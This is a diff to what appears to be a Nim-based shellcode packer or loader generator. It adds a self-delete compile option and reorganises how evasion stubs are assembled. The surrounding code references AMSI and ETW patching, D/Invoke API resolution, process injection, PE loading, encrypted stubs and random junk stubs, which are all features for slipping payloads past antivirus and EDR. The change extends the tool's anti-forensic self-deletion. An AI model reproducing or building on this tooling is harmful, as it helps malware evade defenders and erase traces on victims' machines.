@@ -1389,6 +1389,13 @@ when defined(sleep):
     import random
     import times
 
+when defined(SelfDelete):
+    # Don't want to import the everything from winim, only what's really needed
+    from winim import PWCHAR,HANDLE,DELETE,NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,WINBOOL,FILE_RENAME_INFO,LPWSTR,DWORD,fileRenameInfo,FILE_DISPOSITION_INFO,TRUE
+    from winim import fileDispositionInfo,MAX_PATH,WCHAR,INVALID_HANDLE_VALUE
+    template RtlSecureZeroMemory*(Destination: PVOID, Length: SIZE_T) = zeroMem(Destination, Length)
+    template RtlCopyMemory*(Destination: PVOID, Source: PVOID, Length: SIZE_T) = moveMemory(Destination, Source, Length)
+
 when defined http:
     import winim/inc/winhttp
     import streams
@@ -2093,6 +2100,12 @@ if(AMSI or ETW):
     if(ETW):
         stub.add(ETWExceptionHandlerStub)
 
+if (AMSIPatch or AMSIProviderPatch or ETWPatch or peload or (localinject == false) or selfdelete):
+    if (not noDInvoke):
+        stub.add(DInvokeLoadLibraryAGetProcAddress)
+        if (selfdelete):
+            stub.add(DInvokeSelfDeleteStubs)
+
 stub.add(MainStub)
 
 stub.add(getRandStub())
@@ -2128,11 +2141,8 @@ stub.add(Cryptstub3)
 stub.add(getRandStub())
 stub.add(getRandStub())
 
-if (AMSIPatch or AMSIProviderPatch or ETWPatch or peload or (localinject == false) or selfdelete):
-    if (not noDInvoke): stub.add(DInvokeLoadLibraryAGetProcAddress)
-    if (selfdelete):
-        if (not noDInvoke): stub.add(DInvokeSelfDeleteStubs)
-        stub.add(FileDeleteStub)
+if (selfdelete):
+    stub.add(FileDeleteStub)
 stub.add(getRandStub())
 if (localinject):
     if(AMSI):
@@ -2416,6 +2426,9 @@ if(AMSIProviderPatch):
 
 if(RWX == false):
     basicCompileFlags.add("-d:RX ")
+
+if(selfdelete):
+    basicCompileFlags.add("-d:SelfDelete ")
 
 if(AMSI and oneShot):
     basicCompileFlags.add("-d:oneshot ")
